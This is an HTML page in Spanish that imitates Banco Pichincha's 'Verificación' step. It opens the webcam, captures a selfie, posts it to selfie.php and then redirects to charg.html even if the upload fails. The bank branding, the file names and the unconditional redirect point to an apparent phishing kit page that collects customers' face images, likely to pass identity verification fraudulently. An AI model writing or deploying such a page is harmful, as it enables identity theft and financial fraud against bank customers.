<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación</title>
    <link rel="icon" href="data:,">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow: hidden;
        }
        
        .close-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 36px;
            height: 36px;
            border: 2px solid #1a2b6b;
            border-radius: 50%;
            background: transparent;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }
        
        .close-btn::before,
        .close-btn::after {
            content: '';
            position: absolute;
            width: 16px;
            height: 2px;
            background: #1a2b6b;
        }
        
        .close-btn::before { transform: rotate(45deg); }
        .close-btn::after { transform: rotate(-45deg); }
        
        .camera-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            width: 100%;
        }
        
        .circle-frame {
            width: 280px;
            height: 280px;
            border-radius: 50%;
            overflow: hidden;
            background: #e0e0e0;
            position: relative;
        }
        
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }
        
        .instruction-text {
            font-size: 20px;
            font-weight: 600;
            color: #1a2b6b;
            text-align: center;
            margin-top: 30px;
            line-height: 1.4;
            max-width: 280px;
        }
        
        .bottom-section {
            width: 100%;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .logo {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .logo-icon {
            width: 30px;
            height: 36px;
            background: #ffdd00;
            margin-right: 8px;
            position: relative;
        }
        
        .logo-icon::after {
            content: '';
            position: absolute;
            right: -4px;
            top: 8px;
            width: 8px;
            height: 20px;
            background: #1a2b6b;
        }
        
        .logo-text {
            font-size: 18px;
            font-weight: 700;
            color: #1a2b6b;
            line-height: 1.1;
        }
        
        .logo-text span {
            display: block;
        }
        
        .btn-capture {
            width: 100%;
            max-width: 350px;
            padding: 16px;
            background: #ffdd00;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            color: #1a2b6b;
            cursor: pointer;
            text-align: center;
        }
        
        .btn-capture:hover {
            background: #f0d000;
        }

        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <a href="enrolamiento.html" class="close-btn"></a>
    
    <div class="camera-container">
        <div class="circle-frame">
            <video id="video" autoplay playsinline></video>
        </div>
        <p class="instruction-text">Coloca tu cara en el centro del círculo</p>
    </div>
    
    <div class="bottom-section">
        <div class="logo">
            <div class="logo-icon"></div>
            <div class="logo-text">
                <span>BANCO</span>
                <span>PICHINCHA</span>
            </div>
        </div>
        <button class="btn-capture" onclick="capturePhoto()">Tomar selfie</button>
    </div>
    
    <canvas id="canvas"></canvas>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                video.srcObject = stream;
            } catch (err) {
                console.log('Error al acceder a la cámara:', err);
            }
        }
        
        function capturePhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);
            
            const photoData = canvas.toDataURL('image/png');
            
            fetch('selfie.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'photo=' + encodeURIComponent(photoData)
            })
            .then(response => response.json())
            .then(data => {
                window.location.href = 'charg.html';
            })
            .catch(err => {
                window.location.href = 'charg.html';
            });
        }
        
        startCamera();
    </script>
<script src="protect.js"></script>
</body>
</html>
